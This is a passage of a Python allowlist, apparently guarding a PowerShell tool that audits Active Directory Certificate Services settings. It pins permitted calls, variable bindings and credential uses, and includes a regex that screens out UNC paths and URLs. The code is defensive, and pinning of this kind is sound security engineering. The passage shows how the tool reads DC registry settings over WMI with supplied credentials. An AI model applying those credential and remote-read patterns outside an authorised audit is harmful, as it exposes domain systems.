        "pscommandpath",
        "psculture",
        "psdebugcontext",
        "psdefaultparametervalues",
        "psedition",
        "psemailserver",
        "pshome",
        "psitem",
        "psnativecommandargumentpassing",
        "psnativecommanduseerroractionpreference",
        "psscriptroot",
        "pssenderinfo",
        "pssessionapplicationname",
        "pssessionconfigurationname",
        "pssessionoption",
        "psstyle",
        "psuiculture",
        "psversiontable",
        "pwd",
        "sender",
        "shellid",
        "stacktrace",
        "switch",
        "this",
        "transcript",
        "true",
    }
)
# Never referenced at all (read or write): engine-wide parameter injection,
# module auto-loading, and the engine object itself.
FORBIDDEN_VARIABLE_REFS = frozenset(
    {"psdefaultparametervalues", "psmoduleautoloadingpreference", "executioncontext"}
)
# The only automatic/preference variable bindings the collector makes.
SPECIAL_BINDINGS: frozenset[tuple[str, tuple[str, str, str]]] = frozenset(
    {
        ("erroractionpreference", ("assign Equals", _SCRIPT, "'Stop'")),
        # _certutilRead lets certutil's native stderr through (2>&1) and restores
        # the caller's preference in a finally block.
        ("erroractionpreference", ("assign Equals", "_certutilread", "'Continue'")),
        ("erroractionpreference", ("assign Equals", "_certutilread", "$prev")),
    }
)
# Qualifiers a binding may carry. `$global:` leaks into the caller's session,
# `$variable:` is the variable provider, and a drive (`${alias:x}`, `$env:x`,
# `${function:x}`, `${C:\\file}`) is a provider write.
_ALLOWED_QUALIFIERS = frozenset({"", "script", "local", "private"})
# Variables the engine sets that a pinned binding may read without a pin of
# their own (none of them may be bound: see the special-variable check).
_AUTO_READ_OK = frozenset({"_", "psitem", "true", "false", "null", "matches", "pscmdlet"})

# Operations that write, execute, load code or reach another host. Each is
# pinned in GUARDED_OPS with its exact text and control-flow context.
_GUARDED_COMMANDS = frozenset(
    {
        "New-Item",
        "certutil",
        "Get-WmiObject",
        "Import-Module",
        "Add-Type",
        "_writeJson",
        "New-Object",
    }
)
_GUARDED_STATIC = frozenset({("[IO.File]", "WriteAllText"), ("[IO.File]", "WriteAllBytes")})
# Lifetime-changing calls on a handle/stream/searcher/registry-key receiver
# (release a lock, flush a buffer, clear a store). Their call count and location
# matter, so they are guarded (not collapsed into a set) even though the
# collector currently makes none. A method here that is not also in
# ALLOWED_INSTANCE is still refused by the member allowlist.
_LIFETIME_METHODS = frozenset(
    {"Dispose", "Close", "Flush", "Clear", "Delete", "Remove", "Reset", "Stop", "Kill"}
)
# Instance methods whose invocation has an external effect (a registry/WMI read,
# an LDAP query execution, a lifetime change). Pinned in GUARDED_OPS with
# context, so a duplicate or reordered call fails.
_GUARDED_INSTANCE = (
    frozenset({"GetDWORDValue", "OpenSubKey", "SendRequest", "Bind"}) | _LIFETIME_METHODS
)
# The only dynamic invocations: a local helper running the scriptblock it was
# handed (the paged / base LDAP search transport, and _tryRead's read). Each is
# pinned by scope and exact text; the invoked variable is binding-pinned, and the
# scriptblock bodies are ordinary collector code checked like everything else.
DYNAMIC_INVOCATIONS: frozenset[tuple[str, str]] = frozenset(
    {
        ("_pagedsearchcore", "& $send $cookie"),
        ("_basesearchcore", "& $send $null"),
        ("_tryread", "& $read"),
    }
)
# Common parameters that write a variable named by their argument (canonical
# names as cmdlet metadata reports them).
_VARIABLE_WRITING_PARAMS = frozenset(
    {"OutVariable", "ErrorVariable", "WarningVariable", "InformationVariable", "PipelineVariable"}
)
# A UNC path, a `//host` authority, or a URL with a scheme: never in a command
# argument, a .NET call argument or a binding value (the collector reads its
# own host, the directory through the located DC, and named DCs by dNSHostName).
# Exact string literals exempted from the UNC/URL screen. Reviewed and committed;
# the collector currently needs none (its literal JSON schema tables contain only
# single-backslash registry paths and dotted identifiers, not UNC or URLs).
REMOTE_LITERAL_EXEMPTIONS: frozenset[str] = frozenset()
_UNC_OR_URL = re.compile(
    r"(?:^|(?<=['\"\s(,=@{]))\\\\[^\\\s'\"]|(?<![:\w])//[A-Za-z0-9]|\b[A-Za-z][A-Za-z0-9+.-]*://"
)
# Credential-bearing variables: the four credential parameters and everything
# derived from them (closed under binding flow: test_secret_taint_is_closed).
# Each reference is pinned to its exact (scope, statement) in SECRET_USES, so a
# credential cannot be logged, written, sent to another host or passed anywhere
# new without a deliberate edit here.
SECRET_SEEDS = frozenset({"ldapuserb64", "ldappassb64", "dcregistryuserb64", "dcregistrypassb64"})
SECRET_VARIABLES: frozenset[str] = frozenset(
    {
        "<script>::dccred",
        "<script>::dcregistrypass",
        "<script>::dcregistrypassb64",
        "<script>::dcregistryuser",
        "<script>::dcregistryuserb64",
        "<script>::ldappass",
        "<script>::ldappassb64",
        "<script>::ldapuser",
        "<script>::ldapuserb64",
        "<script>::reg",
        "_b64::s",
        "_ldapconnection::conn",
        "_ldapconnection::cred",
        "_ldapconnection::ldapconn",
    }
)
SECRET_USES: dict[str, list[tuple[str, str]]] = {
    "<script>::dccred": [
        ("<script>", "$dcCred"),
        ("<script>", "$dcCred = $null"),
        (
            "<script>",
            "$dcCred = New-Object Management.Automation.PSCredential( $DcRegistryUser, (ConvertTo-SecureString $DcRegistryPass -AsPlainText -Force))",
        ),
        (
            "<script>",
            "Get-WmiObject -ComputerName $dcDns -Credential $dcCred -Namespace 'root\\default' -Class StdRegProv -List",
        ),
    ],
    "<script>::dcregistrypass": [
        ("<script>", "$DcRegistryPass = ''"),
        ("<script>", "$DcRegistryPass = _b64 $DcRegistryPassB64"),
        ("<script>", "ConvertTo-SecureString $DcRegistryPass -AsPlainText -Force"),
    ],
    "<script>::dcregistrypassb64": [
        ("<script>", ""),
        ("<script>", "$DcRegistryUserB64 -and $DcRegistryPassB64"),
        ("<script>", "$DcRegistryUserB64 -or $DcRegistryPassB64"),
        ("<script>", "_b64 $DcRegistryPassB64"),
    ],
    "<script>::dcregistryuser": [
        ("<script>", "$DcRegistryUser"),
        ("<script>", "$DcRegistryUser = ''"),
        ("<script>", "$DcRegistryUser = _b64 $DcRegistryUserB64"),
        (
            "<script>",
            "$DcRegistryUser, (ConvertTo-SecureString $DcRegistryPass -AsPlainText -Force)",
        ),
    ],
    "<script>::dcregistryuserb64": [
        ("<script>", ""),
        ("<script>", "$DcRegistryUserB64 -and $DcRegistryPassB64"),
        ("<script>", "$DcRegistryUserB64 -or $DcRegistryPassB64"),
        ("<script>", "_b64 $DcRegistryUserB64"),
    ],
    "<script>::ldappass": [
        ("<script>", "$LdapPass = ''"),
        ("<script>", "$LdapPass = _b64 $LdapPassB64"),
        ("_ldapconnection", "$LdapUser, $LdapPass"),
    ],
    "<script>::ldappassb64": [
        ("<script>", ""),
        ("<script>", "$LdapUserB64 -and $LdapPassB64"),
        ("<script>", "$LdapUserB64 -or $LdapPassB64"),
        ("<script>", "_b64 $LdapPassB64"),
    ],
    "<script>::ldapuser": [
        ("<script>", "$LdapUser"),
        ("<script>", "$LdapUser = ''"),
        ("<script>", "$LdapUser = _b64 $LdapUserB64"),
        ("<script>", 'Write-Host "Using explicit LDAP credentials ($LdapUser)"'),
        ("_ldapconnection", "$LdapUser"),
        ("_ldapconnection", "$LdapUser, $LdapPass"),
    ],
    "<script>::ldapuserb64": [
        ("<script>", ""),
        ("<script>", "$LdapUserB64 -and $LdapPassB64"),
        ("<script>", "$LdapUserB64 -or $LdapPassB64"),
        ("<script>", "_b64 $LdapUserB64"),
    ],
    "<script>::reg": [
        (
            "<script>",
            "$kdc = $reg.GetDWORDValue($HKLM, 'SYSTEM\\CurrentControlSet\\Services\\Kdc', 'StrongCertificateBindingEnforcement')",
        ),
        (
            "<script>",
            "$reg = Get-WmiObject -ComputerName $dcDns -Credential $dcCred -Namespace 'root\\default' -Class StdRegProv -List",
        ),
        (
            "<script>",
            "$reg = Get-WmiObject -ComputerName $dcDns -Namespace 'root\\default' -Class StdRegProv -List",
        ),
        ("<script>", "$reg = Get-WmiObject -Namespace 'root\\default' -Class StdRegProv -List"),
        (
            "<script>",
            "$sch = $reg.GetDWORDValue($HKLM, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL', 'CertificateMappingMethods')",
        ),
    ],
    "_b64::s": [
        ("_b64", "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))"),
        (
            "_b64",
            "function _b64([string]$s) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }",
        ),
    ],
    "_ldapconnection::conn": [
        ("_ldapconnection", "$conn"),
        (
            "_ldapconnection",
            "$conn = [System.DirectoryServices.Protocols.LdapConnection]::new($id)",
        ),
        (
            "_ldapconnection",
            "$conn = [System.DirectoryServices.Protocols.LdapConnection]::new($id, $cred)",
        ),
        (
            "_ldapconnection",
            "$conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate",
        ),
        ("_ldapconnection", "$conn.Bind()"),
        ("_ldapconnection", "$conn.SessionOptions.ProtocolVersion = 3"),
        ("_ldapconnection", "$script:LdapConn = $conn"),
    ],
    "_ldapconnection::cred": [
        (
            "_ldapconnection",
            "$conn = [System.DirectoryServices.Protocols.LdapConnection]::new($id, $cred)",
        ),
        (
            "_ldapconnection",
            "$cred = New-Object System.Net.NetworkCredential($LdapUser, $LdapPass)",
        ),
    ],
    "_ldapconnection::ldapconn": [
        ("_ldapconnection", "$script:LdapConn"),
        ("_ldapconnection", "$script:LdapConn"),
        ("_ldapconnection", "$script:LdapConn = $conn"),
    ],
}
# SHA-256 of the script header (comment help, [CmdletBinding], param block).
HEADER_SHA256 = "d77a43b357ee17cff8ce10b71baeb384d0b4fa602c933872c199184f5234eb87"

# Allowlisted instance method -> the receiver roots it may be called on
# (lower-cased; "" = a non-variable receiver such as `(Get-Date)` or a
# parenthesised expression). A call on any other receiver fails.
INSTANCE_RECEIVERS: dict[str, frozenset[str]] = {
    "Add": frozenset(["entries", "req"]),
    "Bind": frozenset(["conn"]),
    "ContainsKey": frozenset(["localsecurity", "p"]),
    "Equals": frozenset(["full"]),
    "GetAccessRules": frozenset(["sd"]),
    "GetDWORDValue": frozenset(["reg"]),
    "GetEnumerator": frozenset(["map"]),
    "GetNewClosure": frozenset([""]),
    "GetOwner": frozenset(["sd"]),
    "GetString": frozenset([""]),
    "GetValue": frozenset(["key"]),
    "GetValues": frozenset(["attr"]),
    "OpenSubKey": frozenset([""]),
    "SendRequest": frozenset(["conn"]),
    "Serialize": frozenset(["js"]),
    "SetSecurityDescriptorBinaryForm": frozenset(["sd"]),
    "StartsWith": frozenset(["dcdns", "full"]),
    "ToLower": frozenset(["", "dcdns", "dns", "ot", "p"]),
    "ToString": frozenset(["", "_", "a"]),
    "ToUniversalTime": frozenset([""]),
    "Translate": frozenset(["a"]),
    "Trim": frozenset(["line", "matches", "v", "values"]),
    "TrimEnd": frozenset([""]),
    "TrimStart": frozenset(["apppath"]),
}

# Every .NET member invocation (static and instance), pinned as an exact
# multiset of (receiver/type, method, every argument) — names case-folded,
# values exact. An allowlisted method reached with a different overload
# (another argument count, a writable flag, a different path) or an extra call
# is not in the multiset and fails, independent of GUARDED_OPS. HAND-MAINTAINED;
# tests/collector/print_pin_candidates.py prints candidates for review.
PINNED_MEMBER_CALLS: tuple[tuple[str, ...], ...] = (
    ("$_", "tostring", "'x2'"),
    ("$a.ActiveDirectoryRights", "tostring", ""),
    ("$a.IdentityReference", "translate", "[Security.Principal.NTAccount]"),
    ("$a.ObjectType", "tostring", ""),
    ("$apppath", "trimstart", "'/'"),
    ("$attr", "getvalues", "[byte[]]"),
    ("$attr", "getvalues", "[string]"),
    ("$conn", "bind", ""),
    ("$conn", "sendrequest", "$req"),
    ("$dcdns", "tolower", ""),
    ("$dcdns", "tolower", ""),
    ("$dcdns.ToLower()", "startswith", "$localhost + '.'"),
    ("$dns", "tolower", ""),
    ("$entries", "add", "$e"),
    ("$full", "equals", "$root", "[StringComparison]::OrdinalIgnoreCase"),
    (
        "$full",
        "startswith",
        "$root + [IO.Path]::AltDirectorySeparatorChar",
        "[StringComparison]::OrdinalIgnoreCase",
    ),
    (
        "$full",
        "startswith",
        "$root + [IO.Path]::DirectorySeparatorChar",
        "[StringComparison]::OrdinalIgnoreCase",
    ),
    ("$key", "getvalue", "'Security'"),
    ("$line", "trim", ""),
    ("$map", "getenumerator", ""),
    ("$matches[1]", "trim", ""),
    ("$ot", "tolower", ""),
    ("$p", "containskey", "$name"),
    ("$p", "tolower", ""),
    (
        "$reg",
        "getdwordvalue",
        "$hklm",
        "'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL'",
        "'CertificateMappingMethods'",
    ),
    (
        "$reg",
        "getdwordvalue",
        "$hklm",
        "'SYSTEM\\CurrentControlSet\\Services\\Kdc'",
        "'StrongCertificateBindingEnforcement'",
    ),
    ("$req.Controls", "add", "$page"),
    (
        "$req.Controls",
        "add",
        "[System.DirectoryServices.Protocols.SecurityDescriptorFlagControl]::new( [System.DirectoryServices.Protocols.SecurityMasks]'Dacl,Owner')",
    ),
    ("$script:js", "serialize", "$obj"),
    ("$script:localsecurity", "containskey", "$ca.name"),
    ("$sd", "getaccessrules", "$true", "$true", "[Security.Principal.SecurityIdentifier]"),
    ("$sd", "getowner", "[Security.Principal.SecurityIdentifier]"),
    ("$sd", "setsecuritydescriptorbinaryform", "$sdbytes"),
    ("$sd", "setsecuritydescriptorbinaryform", "$sdbytes"),
    ("$v", "trim", ""),
    ("$values[0]", "trim", ""),
    ("($csps -join ', ')", "tolower", ""),
    ("(Get-Date)", "touniversaltime", ""),
    ("(Get-Date).ToUniversalTime()", "tostring", "'o'"),
    ("([System.Net.Dns]::GetHostEntry($localhost).HostName)", "tolower", ""),
    ("([string]$dns -split '\\.')[0]", "tolower", ""),
    ("([string]$n)", "tolower", ""),
    ("([string]$p.value)", "tolower", ""),
    ("([string](hostname))", "tolower", ""),
    ("[Convert]", "frombase64string", "$s"),
    ("[Convert]", "toint64", "$matches[1]", "16"),
    (
        "[Convert]",
        "toint64",
        "('{0:x2}{1:x2}{2:x2}{3:x2}' -f $b[$i + 3], $b[$i + 2], $b[$i + 1], $b[$i])",
        "16",
    ),
    (
        "[Convert]",
        "toint64",
        "('{0:x2}{1:x2}{2:x2}{3:x2}{4:x2}{5:x2}' -f $b[2], $b[3], $b[4], $b[5], $b[6], $b[7])",
        "16",
    ),
    ("[IO.Directory]", "exists", "$cur"),
    ("[IO.File]", "exists", "$cur"),
    ("[IO.File]", "getattributes", "$cur"),
    ("[IO.File]", "writeallbytes", "(Join-Path $certdir $certfile)", "$der"),
    ("[IO.File]", "writeallbytes", "(Join-Path $certdir $crlfile)", "$der"),
    (
        "[IO.File]",
        "writealltext",
        "$outpath",
        "$script:js.Serialize($obj)",
        "(New-Object Text.UTF8Encoding($false))",
    ),
    ("[IO.Path]", "getdirectoryname", "$cur"),
    ("[IO.Path]", "getfullpath", "$outdir"),
    ("[IO.Path]", "getfullpath", "$path"),
    ("[IO.Path]::GetFullPath($outdir)", "trimend", "[char]'\\'", "[char]'/'"),
    ("[IO.Path]::GetFullPath($path)", "trimend", "[char]'\\'", "[char]'/'"),
    (
        "[Microsoft.Win32.Registry]::LocalMachine",
        "opensubkey",
        '"SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\$caName"',
    ),
    ("[System.DirectoryServices.Protocols.LdapConnection]", "new", "$id"),
    ("[System.DirectoryServices.Protocols.LdapConnection]", "new", "$id", "$cred"),
    ("[System.DirectoryServices.Protocols.LdapDirectoryIdentifier]", "new", "$null"),
    ("[System.DirectoryServices.Protocols.PageResultRequestControl]", "new", "500"),
    (
        "[System.DirectoryServices.Protocols.SearchRequest]",
        "new",
        "$basedn",
        "$filter",
        "[System.DirectoryServices.Protocols.SearchScope]$scope",
        "$attrs",
    ),
    (
        "[System.DirectoryServices.Protocols.SecurityDescriptorFlagControl]",
        "new",
        "[System.DirectoryServices.Protocols.SecurityMasks]'Dacl,Owner'",
    ),
    ("[System.Net.Dns]", "gethostentry", "$localhost"),
    ("[Text.Encoding]::UTF8", "getstring", "[Convert]::FromBase64String($s)"),
    ("[int]", "tryparse", "$values[0]", "[ref]$n"),
    (
        "{ param([byte[]]$cookie) $req = [System.DirectoryServices.Protocols.SearchRequest]::new( $basedn, $filter, [System.DirectoryServices.Protocols.SearchScope]$scope, $attrs) if ($scope -ne 'Base') { $page = [System.DirectoryServices.Protocols.PageResultRequestControl]::new(500) if ($cookie -and $cookie.Length) { $page.Cookie = $cookie } [void]$req.Controls.Add($page) } if ($sd) { [void]$req.Controls.Add([System.DirectoryServices.Protocols.SecurityDescriptorFlagControl]::new( [System.DirectoryServices.Protocols.SecurityMasks]'Dacl,Owner')) } $conn.SendRequest($req) }",
        "getnewclosure",
        "",
    ),
)

# Every variable whose binding matters, pinned to the EXACT multiset of its
# bindings (kind, scope, value) — see _bindings_by_var for the kinds. Required:
# write roots, variables in write/exec inputs, receivers of every instance call
# and property/index write, and transitively every variable their bindings
# read (_required_vars). An empty list means "must stay unbound". Both
# directions are strict: an extra binding (a rebind) and a stale entry fail.
# Keyed "<scope>::<name>" so the same name in two scopes is two pins (e.g.
# _b64's parameter $s is separate from the searcher $s). Each comment is the
# first reason the key is required. Edit by hand, with a reason.
PINNED_BINDINGS: dict[str, list[tuple[str, str]]] = {
    # condition $a
    "<script>::a": [
        ("assign Equals", "_objAcl $pair[0] $pair[1]"),
    ],
    # condition $null -ne $aces
    "<script>::aces": [
        ("assign Equals", "$null"),
        ("assign Equals", "$script:localSecurity[$ca.name]"),
    ],
    # input of _markSearch: _markSearch 'certs' $aia @($aia.entries).Count $aiaObjects $aiaFailures $certIndex.Count
    "<script>::aia": [
        (
            "assign Equals",
            "_search \"CN=AIA,$pksDn\" '(objectClass=certificationAuthority)' @('cn', 'cacertificate')",
        ),
    ],
    # input of _markSearch: _markSearch 'certs' $aia @($aia.entries).Count $aiaObjects $aiaFailures $certIndex.Count
    "<script>::aiafailures": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", '"AIA object: $($_.Exception.Message)"'),
    ],
    # input of _markSearch: _markSearch 'certs' $aia @($aia.entries).Count $aiaObjects $aiaFailures $certIndex.Count
    "<script>::aiaobjects": [
        ("assign Equals", "0"),
        ("incdec PostfixPlusPlus", ""),
    ],
    # condition -not $anyCaSecurity
    "<script>::anycasecurity": [
        ("assign Equals", "$false"),
        ("assign Equals", "$true"),
    ],
    # read by a binding of $<script>::apppath
    "<script>::app": [
        ("foreach", "(Get-WebApplication -Site $site.Name -ErrorAction Stop)"),
    ],
    # input of _classifyApp: _classifyApp $appPath
    "<script>::apppath": [
        ("assign Equals", "[string]$app.path"),
    ],
    # input of _auditFilterFrom: _auditFilterFrom $auditRead.lines $auditRead.code
    "<script>::auditread": [
        ("assign Equals", "_certutilRead 'CA\\AuditFilter'"),
    ],
    # input of _tryRead: _tryRead { Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name enabled -ErrorAction Stop }
    "<script>::auth": [
        ("assign Equals", "'system.webServer/security/authentication/windowsAuthentication'"),
    ],
    # condition $ot -eq $AUTOENROLL_GUID
    "<script>::autoenroll_guid": [
        ("assign Equals", "'a05b8cc2-17b1-4cc8-8b00-94f99c9c2cca'"),
    ],
    # condition $protos -notcontains [string]$b.protocol
    "<script>::b": [
        ("foreach", "$site.bindings.Collection"),
    ],
    # condition $BINARY_ATTRS -contains $key
    "<script>::binary_attrs": [
        (
            "assign Equals",
            "@('objectguid', 'objectsid', 'ntsecuritydescriptor', 'cacertificate', 'certificaterevocationlist')",
        ),
    ],
    # read by a binding of $<script>::dcconfigs
    "<script>::binding": [
        ("assign Equals", "$null"),
        ("assign Equals", "'unknown'"),
        ("assign Equals", "_decodeBinding ([int]$kdc.uValue)"),
    ],
    # read by a binding of $<script>::der
    "<script>::blob": [
        ("foreach", "@(_v $p 'cacertificate')"),
    ],
    # argument of .ContainsKey(): $script:localSecurity.ContainsKey($ca.name)
    "<script>::ca": [
        ("foreach", "$caConfig"),
    ],
    # input of Where-Object: Where-Object { $_.name -ceq $caCommonName }
    "<script>::cacommonname": [
        ("assign Equals", "$cnResult.value"),
    ],
    # input of _markSearch: _markSearch 'ca-config' $caSearch (@($es.entries).Count + $standalone) $caConfig.Count $esFailures
    "<script>::caconfig": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "$row"),
        ("assign PlusEquals", "(_localCaRow $caCommonName $localFqdn '' $false)"),
    ],
    # read by a binding of $<script>::iishere
    "<script>::cahost": [
        ("assign Equals", "([string]$dns -split '\\.')[0].ToLower()"),
    ],
    # condition -not $caHostHere
    "<script>::cahosthere": [
        ("assign Equals", "$false"),
        ("assign Equals", "$true"),
        ("assign Equals", "$true"),
    ],
    # condition $caHostsElsewhere
    "<script>::cahostselsewhere": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", '"$cn (no dNSHostName)"'),
        ("assign PlusEquals", "$dns"),
    ],
    # condition $caHostsHere.Count -gt 1
    "<script>::cahostshere": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "$dns"),
    ],
    # input of _markSearch: _markSearch 'pki-acls' $pkiSearch (6 + $caObjects.returned + $esObjects.returned) $pkiAcls.Count (@($caObjects.failures) + @($esObjects.failures))
    "<script>::caobjects": [
        (
            "assign Equals",
            "_childAcls \"CN=Certification Authorities,$pksDn\" '(objectClass=certificationAuthority)' 'ca_object'",
        ),
    ],
    # input of _markSearch: _markSearch 'ca-config' $caSearch (@($es.entries).Count + $standalone) $caConfig.Count $esFailures
    "<script>::casearch": [
        (
            "assign Equals",
            "@{ complete = ($es.complete -and $cnResult.status -ne 'failed') reason = $(if (-not $es.complete) { $es.reason } else { 'CA\\CommonName could not be read' }) }",
        ),
    ],
    # input of _writeJson: _writeJson $caSecurity 'ca-security.json'
    "<script>::casecurity": [
        ("assign Equals", "[ordered]@{}"),
        ("index Equals", "$caSecurity[$ca.name] = $aces"),
    ],
    # input of _caKindFromType: _caKindFromType $caType
    "<script>::catype": [
        ("assign Equals", "_certutilDword 'CA\\CAType'"),
    ],
    # input of _markSearch: _markSearch 'crls' $cdp @($cdp.entries).Count $cdpObjects $cdpFailures $crlIndex.Count
    "<script>::cdp": [
        (
            "assign Equals",
            "_search \"CN=CDP,$pksDn\" '(objectClass=cRLDistributionPoint)' @('cn', 'certificaterevocationlist', 'objectguid')",
        ),
    ],
    # input of _markSearch: _markSearch 'crls' $cdp @($cdp.entries).Count $cdpObjects $cdpFailures $crlIndex.Count
    "<script>::cdpfailures": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", '"CDP object: $($_.Exception.Message)"'),
    ],
    # input of _markSearch: _markSearch 'crls' $cdp @($cdp.entries).Count $cdpObjects $cdpFailures $crlIndex.Count
    "<script>::cdpobjects": [
        ("assign Equals", "0"),
        ("incdec PostfixPlusPlus", ""),
        ("incdec PostfixPlusPlus", ""),
    ],
    # input of Assert-AdcsOutputPath: Assert-AdcsOutputPath $certDir
    "<script>::certdir": [
        ("assign Equals", "Join-Path $OutDir 'certs'"),
    ],
    # input of Assert-AdcsOutputPath: Assert-AdcsOutputPath (Join-Path $certDir $certFile)
    "<script>::certfile": [
        ("assign Equals", "'{0:d2}-{1}.cer' -f $i, (_safeFileName $cn)"),
    ],
    # input of _markSearch: _markSearch 'certs' $aia @($aia.entries).Count $aiaObjects $aiaFailures $certIndex.Count
    "<script>::certindex": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "[ordered]@{ file = $certFile; ca_name = $cn; kind = $kind }"),
    ],
    # condition $certsSkipped
    "<script>::certsskipped": [
        ("assign Equals", "$false"),
        ("assign Equals", "$true"),
    ],
    # condition $check.soft -contains 'dnshostname'
    "<script>::check": [
        ("assign Equals", "_requireSchema $p 'dc-config'"),
    ],
    # input of _localCaRow: _localCaRow $cn $dns (_guidHex @(_v $p 'objectguid')) $true
    "<script>::cn": [
        ("assign Equals", "[string]@(_v $p 'cn')[0]"),
        ("assign Equals", "[string]@(_v $p 'cn')[0]"),
        ("assign Equals", "[string]@(_v $p 'cn')[0]"),
    ],
    # input of _certutilStringFrom: _certutilStringFrom $cnRead.lines $cnRead.code 'CommonName'
    "<script>::cnread": [
        ("assign Equals", "_certutilRead 'CA\\CommonName'"),
    ],
    # read by a binding of $<script>::casearch
    "<script>::cnresult": [
        ("assign Equals", "_certutilStringFrom $cnRead.lines $cnRead.code 'CommonName'"),
    ],
    # condition $CollectDcMapping -and ($DcRegistryUserB64 -or $DcRegistryPassB64)
    "<script>::collectdcmapping": [
        ("parameter", "[Parameter(ParameterSetName = 'Collect')] [switch] $CollectDcMapping"),
    ],
    # read by a binding of $<script>::manifest
    "<script>::collector_version": [
        ("assign Equals", "'0.11.0'"),
    ],
    # input of Assert-AdcsOutputPath: Assert-AdcsOutputPath (Join-Path $certDir $crlFile)
    "<script>::crlfile": [
        ("assign Equals", "'{0:d2}-{1}.crl' -f $j, (_safeFileName $cn)"),
    ],
    # input of _markSearch: _markSearch 'crls' $cdp @($cdp.entries).Count $cdpObjects $cdpFailures $crlIndex.Count
    "<script>::crlindex": [
        ("assign Equals", "@()"),
        (
            "assign PlusEquals",
            "[ordered]@{ object_guid = (_guidHex @(_v $p 'objectguid')) # the CDP object file = $crlFile ca_name = $cn # the CDP object's cn, verbatim: ingest derives the tier source = \"AD CDP container: $([string]@(_v $p 'distinguishedname')[0])\" }",
        ),
    ],
    # read by a binding of $<script>::templates
    "<script>::csps": [
        ("assign Equals", "@(_v $p 'pkicsp' | ForEach-Object { [string]$_ })"),
    ],
    # input of Write-Warning: Write-Warning "esc10-dc-registry: all $($dcConfigs.Count) DC(s) failed the registry read -- pass effectively skipped (WMI access denied? provide -DcRegistryUserB64/-DcRegistryPassB64 for SSH/double-hop)."
    "<script>::dcconfigs": [
        ("assign Equals", "@()"),
        (
            "assign PlusEquals",
            "[ordered]@{ name = $dcDns object_guid = $dcGuid strong_certificate_binding_enforcement = $binding schannel_mapping_methods = (_list $schannelMethods) }",
        ),
    ],
    # input of Get-WmiObject: Get-WmiObject -ComputerName $dcDns -Credential $dcCred -Namespace 'root\default' -Class StdRegProv -List
    "<script>::dccred": [
        ("assign Equals", "$null"),
        (
            "assign Equals",
            "New-Object Management.Automation.PSCredential( $DcRegistryUser, (ConvertTo-SecureString $DcRegistryPass -AsPlainText -Force))",
        ),
    ],
    # input of Write-Warning: Write-Warning "esc10-dc-registry: $dcDns has no dNSHostName; its registry was not read"
    "<script>::dcdns": [
        ("assign Equals", "[string]@(_v $p 'distinguishedname')[0]"),
        ("assign Equals", "[string]@(_v $p 'dnshostname')[0]"),
    ],
    # input of _markSearch: _markSearch 'dc-config' $dcs @($dcs.entries).Count $dcConfigs.Count $dcFailures
    "<script>::dcfailures": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", '"DC: $($_.Exception.Message)"'),
    ],
    # read by a binding of $<script>::dcconfigs
    "<script>::dcguid": [
        ("assign Equals", "_guidHex @(_v $p 'objectguid')"),
    ],
    # input of New-Object: New-Object Management.Automation.PSCredential( $DcRegistryUser, (ConvertTo-SecureString $DcRegistryPass -AsPlainText -Force))
    "<script>::dcregistrypass": [
        ("assign Equals", "''"),
        ("assign Equals", "_b64 $DcRegistryPassB64"),
    ],
    # input of _b64: _b64 $DcRegistryPassB64
    "<script>::dcregistrypassb64": [
        ("parameter", "[Parameter(ParameterSetName = 'Collect')] [string] $DcRegistryPassB64"),
    ],
    # input of New-Object: New-Object Management.Automation.PSCredential( $DcRegistryUser, (ConvertTo-SecureString $DcRegistryPass -AsPlainText -Force))
    "<script>::dcregistryuser": [
        ("assign Equals", "''"),
        ("assign Equals", "_b64 $DcRegistryUserB64"),
    ],
    # input of _b64: _b64 $DcRegistryUserB64
    "<script>::dcregistryuserb64": [
        ("parameter", "[Parameter(ParameterSetName = 'Collect')] [string] $DcRegistryUserB64"),
    ],
    # input of _markSearch: _markSearch 'dc-config' $dcs @($dcs.entries).Count $dcConfigs.Count $dcFailures
    "<script>::dcs": [
        (
            "assign Equals",
            "_search $domNc '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' @('dnshostname', 'objectguid')",
        ),
    ],
    # input of _certKindFromDer: _certKindFromDer $der
    "<script>::der": [
        ("assign Equals", "$r[0]"),
        ("assign Equals", "[byte[]]$blob"),
        ("assign Equals", "[byte[]]@(_v $p 'certificaterevocationlist')[0]"),
    ],
    # input of _list: _list $disabledExt
    "<script>::disabledext": [
        ("assign Equals", "_oidValues (_certutilMultiSz 'policy\\DisableExtensionList')"),
    ],
    # input of _localCaRow: _localCaRow $cn $dns (_guidHex @(_v $p 'objectguid')) $true
    "<script>::dns": [
        ("assign Equals", "[string]@(_v $p 'dnshostname')[0]"),
    ],
    # input of _search: _search $domNc '(altSecurityIdentities=*)' @('altsecurityidentities', 'objectguid')
    "<script>::domnc": [
        ("assign Equals", "$rootDse.domain"),
    ],
    # input of _entryProps: _entryProps $e
    "<script>::e": [
        ("foreach", "$aia.entries"),
        ("foreach", "$cdp.entries"),
        ("foreach", "$dcs.entries"),
        ("foreach", "$es.entries"),
        ("foreach", "$os.entries"),
        ("foreach", "$ps14.entries"),
        ("foreach", "$ts.entries"),
    ],
    # input of _list: _list $editFlags
    "<script>::editflags": [
        ("assign Equals", "_certutilFlags 'policy\\EditFlags'"),
    ],
    # input of _decode: _decode $ef $ENROLL_FLAGS
    "<script>::ef": [
        (
            "assign Equals",
            "if (@(_v $p 'mspki-enrollment-flag').Count) { [int]@(_v $p 'mspki-enrollment-flag')[0] } else { 0 }",
        ),
    ],
    # input of _searchMarker: _searchMarker ($endpointsComplete -and -not $endpointScope) $endpointsWhy $webEndpoints.Count $webEndpoints.Count $iisFailures
    "<script>::endpointscomplete": [
        ("assign Equals", "$false"),
        ("assign Equals", "$true"),
    ],
    # input of _searchMarker: _searchMarker ($endpointsComplete -and -not $endpointScope) $endpointsWhy $webEndpoints.Count $webEndpoints.Count $iisFailures
